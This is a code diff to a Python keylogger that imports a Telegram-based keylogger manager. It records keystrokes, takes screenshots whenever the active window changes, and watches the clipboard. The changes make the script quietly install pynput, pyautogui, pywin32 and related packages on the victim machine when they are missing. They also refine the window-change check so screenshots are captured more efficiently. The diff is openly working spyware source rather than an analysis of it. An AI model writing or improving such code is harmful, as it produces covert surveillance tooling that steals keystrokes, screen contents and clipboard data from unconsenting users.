@@ -1,19 +1,28 @@
-from pynput.keyboard import Key, Listener
-import logging
-import getpass
-import threading
-import time
-from pynput import keyboard
-import pyautogui
-import os
-from pynput.keyboard import Key, Listener
-from KeyloggerManager import TelegramKeylogger
+import subprocess
+import sys
+def install_packages():
+    packages = [
+        "pywin32", "pynput", "pyautogui", "python-dotenv", "requests", "pyperclip"
+    ]
+    for package in packages:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
+
 
 try:
+    from pynput.keyboard import Key, Listener
+    import logging
+    import getpass
+    import threading
+    import time
+    from pynput import keyboard
+    import pyautogui
+    import os
+    from pynput.keyboard import Key, Listener
+    from KeyloggerManager import TelegramKeylogger
     import win32api
     import win32gui
 except ImportError:
-    print("нужно установить pywin32")
+    install_packages()
 
 username = getpass.getuser()
 
@@ -180,13 +189,31 @@ def screenshot_monitor(interval=120):
     last_screenshot_time = 0
     last_clipboard_content = ""
 
+    def is_same_window(window1, window2):
+        if window1 == window2:
+            return True
+
+        ignore_patterns = [' - Прокрутка', ' - Scroll', '...', ' — ']
+
+        if window1 and window2:
+            base1 = window1[:20]
+            base2 = window2[:20]
+            if base1 == base2:
+                return True
+
+            for pattern in ignore_patterns:
+                if pattern in window1 and pattern in window2:
+                    return True
+
+        return False
+
     while True:
         try:
             current_time = time.time()
             current_window = get_active_window()
 
             # Триггер смена активного окна
-            if (current_window != last_window and
+            if (not is_same_window(current_window, last_window) and
                     current_window != "unknown" and
                     current_time - last_screenshot_time > 15):
 
@@ -199,6 +226,8 @@ def screenshot_monitor(interval=120):
                 count += 1
                 last_window = current_window
                 last_screenshot_time = current_time
+            else:
+                last_window = current_window
 
             # Триггер изменение буфера обмена
             try:
